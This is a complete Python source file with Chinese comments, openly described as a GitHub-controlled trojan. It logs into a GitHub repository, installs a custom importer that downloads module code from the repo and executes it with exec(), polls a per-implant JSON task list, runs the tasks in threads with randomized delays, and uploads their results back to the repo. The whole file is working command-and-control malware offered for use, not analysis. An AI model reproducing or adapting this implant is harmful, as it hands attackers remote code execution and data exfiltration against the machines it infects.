import json
import base64
import sys
import time
import importlib
import importlib.util
import random
import threading
import queue
import os
import types
import logging
import argparse
from pathlib import Path
from typing import Optional, Tuple, List
from github3 import login, GitHub
from github3.exceptions import GitHubError

# 配置日志，记录程序运行信息和错误
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 任务队列，用于管理模块执行
task_queue = queue.Queue()

class GitImporter:
    """
    自定义模块导入器，从 GitHub 加载远程模块
    """
    def __init__(self, gh: GitHub, repo_owner: str, repo_name: str, branch_name: str):
        """
        初始化 GitImporter
        :param gh: GitHub 客户端
        :param repo_owner: 仓库拥有者
        :param repo_name: 仓库名称
        :param branch_name: 分支名称
        """
        self.gh = gh
        self.repo_owner = repo_owner
        self.repo_name = repo_name
        self.branch_name = branch_name
        self.current_module_code = b""

    def find_module(self, fullname: str, path: Optional[str] = None) -> Optional['GitImporter']:
        """
        查找模块，尝试从 GitHub 获取模块代码
        :param fullname: 模块名称
        :param path: 模块路径
        :return: 自身（如果找到模块）或 None
        """
        filepath = f"modules/{fullname}.py"
        logging.info("尝试获取模块: %s", fullname)
        content = get_file_contents(self.gh, self.repo_owner, self.repo_name, self.branch_name, filepath)
        if content is not None:
            self.current_module_code = content
            return self
        return None

    def load_module(self, fullname: str) -> types.ModuleType:
        """
        加载模块，将远程代码导入 Python
        :param fullname: 模块名称
        :return: 加载的模块对象
        """
        spec = importlib.util.spec_from_loader(fullname, loader=None)
        if spec is None:
            raise ImportError(f"无法创建模块规范: {fullname}")
        
        module = importlib.util.module_from_spec(spec)
        sys.modules[fullname] = module
        try:
            exec(self.current_module_code, module.__dict__)
        except Exception as e:
            logging.error("加载模块 %s 失败: %s", fullname, str(e))
            raise ImportError(f"执行模块代码失败: {str(e)}")
        
        return module

def connect_to_github(username: str, password: str, repo_owner: str, repo_name: str, branch_name: str) -> Tuple[GitHub, 'Repository', 'Branch']:
    """
    连接到 GitHub 并获取仓库和分支
    :param username: GitHub 用户名
    :param password: GitHub 密码或令牌
    :param repo_owner: 仓库拥有者
    :param repo_name: 仓库名称
    :param branch_name: 分支名称
    :return: GitHub 客户端、仓库和分支对象
    """
    try:
        gh = login(username=username, password=password)
        repo = gh.repository(repo_owner, repo_name)
        branch = repo.branch(branch_name)
        logging.info("成功连接到 GitHub 仓库: %s/%s", repo_owner, repo_name)
        return gh, repo, branch
    except GitHubError as e:
        logging.error("GitHub 连接失败: %s", str(e))
        raise

def get_file_contents(gh: GitHub, repo_owner: str, repo_name: str, branch_name: str, filepath: str) -> Optional[bytes]:
    """
    从 GitHub 仓库获取文件内容
    :param gh: GitHub 客户端
    :param repo_owner: 仓库拥有者
    :param repo_name: 仓库名称
    :param branch_name: 分支名称
    :param filepath: 文件路径
    :return: 文件内容的字节对象，或 None（如果文件不存在）
    """
    try:
        repo = gh.repository(repo_owner, repo_name)
        branch = repo.branch(branch_name)
        tree = branch.commit.commit.tree.recurse()

        for item in tree.tree:
            if filepath in item.path:
                logging.info("找到文件: %s", filepath)
                blob = repo.blob(item.sha)
                return base64.b64decode(blob.content)
        logging.warning("文件 %s 未找到", filepath)
        return None
    except GitHubError as e:
        logging.error("获取文件 %s 失败: %s", filepath, str(e))
        return None

def get_trojan_config(gh: GitHub, repo_owner: str, repo_name: str, branch_name: str, config_file: str) -> List[dict]:
    """
    获取特洛伊木马的配置文件
    :param gh: GitHub 客户端
    :param repo_owner: 仓库拥有者
    :param repo_name: 仓库名称
    :param branch_name: 分支名称
    :param config_file: 配置文件路径
    :return: 配置字典列表
    """
    global configured
    config_json = get_file_contents(gh, repo_owner, repo_name, branch_name, config_file)
    if config_json is None:
        logging.error("无法获取配置文件: %s", config_file)
        raise FileNotFoundError("配置文件未找到")
    
    try:
        config = json.loads(config_json.decode('utf-8'))
        configured = True
        logging.info("成功加载配置文件，任务数: %d", len(config))

        for task in config:
            module_name = task.get('module')
            if module_name and module_name not in sys.modules:
                logging.info("动态导入模块: %s", module_name)
                __import__(module_name)
        return config
    except json.JSONDecodeError as e:
        logging.error("解析配置文件失败: %s", str(e))
        raise
    except ImportError as e:
        logging.error("导入模块失败: %s", str(e))
        raise

def store_module_result(data: bytes, gh: GitHub, repo_owner: str, repo_name: str) -> None:
    """
    将模块执行结果存储到 GitHub
    :param data: 模块执行结果（字节对象）
    :param gh: GitHub 客户端
    :param repo_owner: 仓库拥有者
    :param repo_name: 仓库名称
    """
    try:
        repo = gh.repository(repo_owner, repo_name)
        remote_path = f"data/{trojan_id}/{random.randint(1000, 100000)}.data"
        repo.create_file(remote_path, "模块执行结果", base64.b64encode(data))
        logging.info("成功存储结果到: %s", remote_path)
    except GitHubError as e:
        logging.error("存储结果失败: %s", str(e))

def module_runner(module: str, gh: GitHub, repo_owner: str, repo_name: str) -> None:
    """
    执行模块并存储结果
    :param module: 模块名称
    :param gh: GitHub 客户端
    :param repo_owner: 仓库拥有者
    :param repo_name: 仓库名称
    """
    task_queue.put(1)
    try:
        result = sys.modules[module].run()
        store_module_result(result.encode('utf-8') if isinstance(result, str) else result, gh, repo_owner, repo_name)
    except Exception as e:
        logging.error("执行模块 %s 失败: %s", module, str(e))
    finally:
        task_queue.get()

def main():
    """
    主函数，初始化并运行特洛伊木马
    """
    parser = argparse.ArgumentParser(description="GitHub 控制的特洛伊木马")
    parser.add_argument("--username", required=True, help="GitHub 用户名")
    parser.add_argument("--password", required=True, help="GitHub 密码或令牌")
    parser.add_argument("--repo-owner", required=True, help="GitHub 仓库拥有者")
    parser.add_argument("--repo-name", required=True, help="GitHub 仓库名称")
    parser.add_argument("--branch", default="master", help="GitHub 分支名称")
    parser.add_argument("--trojan-id", default="config", help="特洛伊木马 ID")
    args = parser.parse_args()

    # 初始化全局变量
    global trojan_id, trojan_config, data_path
    trojan_id = args.trojan_id
    trojan_config = f"{trojan_id}.json"
    data_path = f"data/{trojan_id}/"

    # 创建数据目录
    os.makedirs(data_path, exist_ok=True)

    # 连接 GitHub
    try:
        gh, repo, branch = connect_to_github(args.username, args.password, args.repo_owner, args.repo_name, args.branch)
    except Exception as e:
        logging.error("初始化失败: %s", str(e))
        return

    # 注册自定义模块导入器
    sys.meta_path.insert(0, GitImporter(gh, args.repo_owner, args.repo_name, args.branch))

    while True:
        if task_queue.empty():
            try:
                config = get_trojan_config(gh, args.repo_owner, args.repo_name, args.branch, trojan_config)
                threads = []
                for task in config:
                    module = task.get('module')
                    if module:
                        t = threading.Thread(target=module_runner, args=(module, gh, args.repo_owner, args.repo_name))
                        t.start()
                        threads.append(t)
                        time.sleep(random.randint(1, 10))
                
                # 等待线程完成
                for t in threads:
                    t.join()
            except Exception as e:
                logging.error("任务执行失败: %s", str(e))
        
        time.sleep(random.randint(10, 60))  # 减少睡眠时间，避免过长等待

if __name__ == "__main__":
    main()